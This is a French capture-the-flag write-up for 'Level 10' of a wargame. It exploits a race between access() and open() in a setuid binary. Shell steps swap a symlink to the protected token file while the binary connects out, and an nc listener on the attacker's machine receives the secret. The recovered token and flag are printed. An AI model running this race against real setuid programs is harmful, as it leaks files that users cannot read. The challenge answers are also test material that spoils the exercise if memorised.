# Level 10

Comme pour le level 8 et 9 nous avons toujours 2 fichiers, un binaire portant le nom du level et un fichier token.

Comme pour le level 8 et le level 10, n'avons pas les droits pour lire le fichier token, mais le binaire possède un stickybit qui lui donne les droit de son owner flag10, qui est le même que l'owner du token.

Quand on décompile le binaire, on peut voir qu'il essaye de se connecter à un adresse ip passée en argument sur le port `6969` et d'écrire le fichier passé en argument sur le serveur.

Avant de se connecter, la fonction access est appellée afin de vérifier les droits de l'utilisateur réel (donc qui exécute le binaire). L'utilisateur réel level10 n'as pas les droits sur le fichier token.

Mais l'utilisation d'`access` puis `open` crée un trou de sécurité comme l'explique le man de [access](http://manpagesfr.free.fr/man/man2/access.2.html), car entre le temps de la vérification et de l'ouverture nous pouvons crée un lien symbolique d'un fichier ou quel nous n'avons pas les droits réel.

Ainsi, il est possible de donner en paramètre à lexécutable un fichier sur lequel nous avons tous les droits, afin que la fonction access retourne une réponse positive.

Ensuite, en passant l'adresse IP du vboxnet 192.168.56.1, l'executable `level10` attend une réponse ce qui nous laisse le temps de créer un lien symbolique sur le fichier passé en paramètre vers le fichier token.

Sur le serveur tty1:

```sh
~ echo "123" > /tmp/link
~ ./level10 /tmp/link 192.168.56.1
Connecting to 192.168.56.1:6969 ..
[wait]
```

Sur le serveur tty2:

```sh
~ ln -fs /home/user/level10/token /tmp/link
```

Sur notre machine local:

```sh
~ nc -lv 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

Sur le serveur tty1:

```sh
~ ./level10 /tmp/link 192.168.56.1
Connecting to 192.168.56.1:6969 .. Connected!
Sending file .. wrote file!
~ su flag10
Password:
Don\'t forget to launch getflag !
~ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

